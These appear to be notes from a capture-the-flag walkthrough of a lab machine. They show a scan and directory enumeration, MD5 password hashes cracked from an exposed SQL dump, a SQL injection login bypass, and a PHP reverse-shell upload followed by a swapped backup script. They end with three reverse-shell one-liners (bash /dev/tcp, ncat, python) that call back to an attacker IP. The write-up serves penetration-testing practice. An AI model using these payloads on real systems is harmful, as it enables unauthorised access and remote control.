nmap scan
```
port 22 - ssh
port 80 - http
port 445 - http
```

gobuster (port 80)
```
/admin -> red herring
/passwd -> red herring
/shadow -> red herring
```

next time gobuster scan port 445.
found /management
`oretnom23` as possible creds


http://10.10.227.233:445/management/database/traffic_offense_db.sql
```
INSERT INTO `users` (`id`, `firstname`, `lastname`, `username`, `password`, `avatar`, `last_login`, `type`, `date_added`, `date_updated`) VALUES
(1, 'Adminstrator', 'Admin', 'admin', '0192023a7bbd73250516f069df18b500', 'uploads/1624240500_avatar.png', NULL, 1, '2021-01-20 14:02:37', '2021-06-21 09:55:07'),
(9, 'John', 'Smith', 'jsmith', '1254737c076cf867dc53d60a0364f38e', 'uploads/1629336240_avatar.jpg', NULL, 2, '2021-08-19 09:24:25', NULL);
```
hashes were identified to be MD5 so we cracked them with hashcat
```
0192023a7bbd73250516f069df18b500:admin123                 
1254737c076cf867dc53d60a0364f38e:jsmith123  
```

creds
`admin:admin123`
`jsmith:jsmith123`



```
└─$ goCommon http://10.10.227.233:445/management/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.227.233:445/management/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html,js
[+] Timeout:                 10s
===============================================================
2022/09/25 12:46:42 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 279]
/.htaccess.js         (Status: 403) [Size: 279]
/.hta.html            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/.hta.js              (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/.htaccess.txt        (Status: 403) [Size: 279]
/.hta.php             (Status: 403) [Size: 279]
/.htpasswd.txt        (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.hta.txt             (Status: 403) [Size: 279]
/.htpasswd.html       (Status: 403) [Size: 279]
/.htaccess.html       (Status: 403) [Size: 279]
/.htpasswd.js         (Status: 403) [Size: 279]
/404.html             (Status: 200) [Size: 198]
/about.html           (Status: 200) [Size: 1836]
/admin                (Status: 301) [Size: 330] [--> http://10.10.227.233:445/management/admin/]
/assets               (Status: 301) [Size: 331] [--> http://10.10.227.233:445/management/assets/]
/build                (Status: 301) [Size: 330] [--> http://10.10.227.233:445/management/build/] 
/classes              (Status: 301) [Size: 332] [--> http://10.10.227.233:445/management/classes/]
/config.php           (Status: 200) [Size: 0]                                                     
/database             (Status: 301) [Size: 333] [--> http://10.10.227.233:445/management/database/]
/dist                 (Status: 301) [Size: 329] [--> http://10.10.227.233:445/management/dist/]    
/home.php             (Status: 500) [Size: 229]                                                    
/inc                  (Status: 301) [Size: 328] [--> http://10.10.227.233:445/management/inc/]     
/index.php            (Status: 200) [Size: 14506]                                                  
/index.php            (Status: 200) [Size: 14506]                                                  
/libs                 (Status: 301) [Size: 329] [--> http://10.10.227.233:445/management/libs/]    
/pages                (Status: 301) [Size: 330] [--> http://10.10.227.233:445/management/pages/]   
/plugins              (Status: 301) [Size: 332] [--> http://10.10.227.233:445/management/plugins/] 
/uploads              (Status: 301) [Size: 332] [--> http://10.10.227.233:445/management/uploads/] 

```

Basic SQL injection to login as admin on site
`admin' or '1'='1' #`


Was able to upload a reverse-shell.php file into the user's avatar field to get a reverse shell

```
www-data@plotted:/var/www/scripts$ ls -la
total 12
drwxr-xr-x 2 www-data   www-data   4096 Oct 28  2021 .
drwxr-xr-x 4 root       root       4096 Oct 28  2021 ..
-rwxrwxr-- 1 plot_admin plot_admin  141 Oct 28  2021 backup.sh
www-data@plotted:/var/www/scripts$ rm backup.sh
rm: remove write-protected regular file 'backup.sh'? yes

```

`0<&196;exec 196<>/dev/tcp/10.13.46.127/1112; sh <&196 >&196 2>&196`
`ncat 10.13.46.127 1112 -e /bin/bash`
"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'"
